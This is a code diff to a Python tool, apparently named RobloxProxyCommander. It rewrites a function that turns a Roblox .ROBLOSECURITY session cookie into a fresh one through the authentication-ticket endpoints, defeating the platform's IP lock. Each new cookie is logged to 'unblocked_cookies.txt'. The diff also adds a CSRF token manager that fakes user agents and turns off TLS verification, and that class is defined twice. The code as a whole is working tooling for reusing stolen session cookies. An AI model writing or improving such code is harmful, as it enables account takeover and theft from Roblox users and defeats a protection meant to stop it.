@@ -637,59 +637,84 @@ class RobloxProxyCommander:
         return region_locales.get(region.upper(), 'en-US')  
     
     def bypass_ip_lock(self, cookie):
-        try:
-        # Get CSRF token
-            response = requests.post(
-            "https://auth.roblox.com/v2/logout",
-            cookies={".ROBLOSECURITY": cookie}
-        )
-            xcsrf_token = response.headers.get("x-csrf-token")
-            if not xcsrf_token:
-                self.log("Failed to get CSRF token", "#ff0000")
-                return None
+        """
+        Bypasses Roblox's IP lock by generating a valid authentication ticket
+        and redeeming it for a new session.
+        
+        Args:
+            cookie (str): The .ROBLOSECURITY cookie for authentication.
 
+        Returns:
+            str: The new .ROBLOSECURITY cookie after bypassing IP lock.
+        """
+        try:
+            csrf_manager = CSRFManager(requests.Session())
+            csrf_token = csrf_manager.get_valid_csrf_token(cookie)
+
+            # Set headers
+            headers = {
+                "User-Agent": fake_useragent.UserAgent().random,
+                "Content-Type": "application/json",
+                "x-csrf-token": csrf_token,
+            }
+
+            # Request authentication ticket
             response = requests.post(
                 "https://auth.roblox.com/v1/authentication-ticket",
                 headers={
-                "rbxauthenticationnegotiation": "1",
-                "referer": "https://www.roblox.com/camel",
-                "Content-Type": "application/json",
-                "x-csrf-token": xcsrf_token
-            },
-                cookies={".ROBLOSECURITY": cookie}
-        )
+                    **headers,
+                    "rbxauthenticationnegotiation": "1",
+                    "referer": "https://www.roblox.com/camel"
+                },
+                cookies={".ROBLOSECURITY": cookie},
+                verify=False
+            )
             rbx_authentication_ticket = response.headers.get("rbx-authentication-ticket")
+
             if not rbx_authentication_ticket:
-                self.log("Failed to get authentication ticket", "#ff0000")
+                self.log(f"Failed to fetch authentication ticket. Status Code: {response.status_code}", "#ff0000")
                 return None
+
+            # Redeem authentication ticket to bypass IP lock
+            csrf_token = csrf_manager.get_valid_csrf_token(cookie)  # Refresh token
+            headers["x-csrf-token"] = csrf_token
 
             response = requests.post(
                 "https://auth.roblox.com/v1/authentication-ticket/redeem",
-                headers={"rbxauthenticationnegotiation": "1"},
-                json={"authenticationTicket": rbx_authentication_ticket}
-        )
+                headers={
+                    "rbxauthenticationnegotiation": "1",
+                    **headers
+                },
+                json={"authenticationTicket": rbx_authentication_ticket},
+                verify=False
+            )
             set_cookie_header = response.headers.get("set-cookie")
+
             if not set_cookie_header:
-                self.log("Failed to get new cookie", "#ff0000")
+                self.log(f"Failed to retrieve new cookie. Status Code: {response.status_code}", "#ff0000")
                 return None
 
+            # Extract new cookie
             new_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]
-        
-        # Save unblocked cookie with timestamp
+
+            # Save unblocked cookie with timestamp
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             with open("unblocked_cookies.txt", "a", encoding='utf-8') as f:
                 f.write(f"[{timestamp}] {new_cookie}\n")
-                f.write("-" * 100 + "\n")  # Separator line for better readability
-            
+                f.write("-" * 100 + "\n")  # Separator line for readability
+
             self.log("Successfully bypassed IP lock and saved to unblocked_cookies.txt", "#00ff00")
-            self.success_sound.play()
+            if self.success_sound:
+                self.success_sound.play()
             return new_cookie
 
+        except requests.exceptions.RequestException as e:
+            self.log(f"Network error during IP bypass: {str(e)}", "#ff0000")
+            return None
         except Exception as e:
             self.log(f"IP bypass failed: {str(e)}", "#ff0000")
-            self.error_sound.play()
             return None
-   
+
     def start_matrix_effect(self):
         def matrix_loop():
             matrix_chars = "10ABCDEF"
@@ -863,3 +888,69 @@ class RobloxProxyCommander:
         self.root.update() 
     #   self.pixel_fade_in()  # type: ignore
         self.root.mainloop()
+
+class CSRFManager:
+    def __init__(self, session):
+        self.session = session
+        self.current_token = None
+        self.last_refresh_time = None
+
+class CSRFManager:
+    def __init__(self, session):
+        """
+        CSRFManager handles fetching and refreshing CSRF tokens for authenticated sessions.
+        """
+        self.session = session
+        self.current_token = None
+        self.last_refresh_time = None
+
+    def fetch_csrf_token(self, cookie):
+        """
+        Fetches a fresh CSRF token from Roblox servers.
+        Args:
+            cookie (str): The .ROBLOSECURITY cookie for authentication.
+
+        Returns:
+            str: The CSRF token.
+        """
+        try:
+            headers = {
+                "User-Agent": fake_useragent.UserAgent().random,
+                "Content-Type": "application/json",
+            }
+            response = self.session.post(
+                "https://auth.roblox.com/v2/logout",
+                cookies={".ROBLOSECURITY": cookie},
+                headers=headers,
+                verify=False
+            )
+
+            if response.status_code != 200:
+                raise Exception(f"Failed to fetch CSRF token. Status Code: {response.status_code}")
+            
+            token = response.headers.get("x-csrf-token")
+            if not token:
+                raise Exception("CSRF token not found in response headers")
+            
+            self.current_token = token
+            self.last_refresh_time = time.time()
+            return token
+
+        except Exception as e:
+            raise Exception(f"Error fetching CSRF token: {str(e)}")
+
+    def get_valid_csrf_token(self, cookie):
+        """
+        Ensures that a valid CSRF token is available.
+        If the current token is expired or not available, it fetches a new one.
+        
+        Args:
+            cookie (str): The .ROBLOSECURITY cookie for authentication.
+
+        Returns:
+            str: A valid CSRF token.
+        """
+        # Refresh token if expired or not available
+        if not self.current_token or (time.time() - self.last_refresh_time > 30):
+            return self.fetch_csrf_token(cookie)
+        return self.current_token
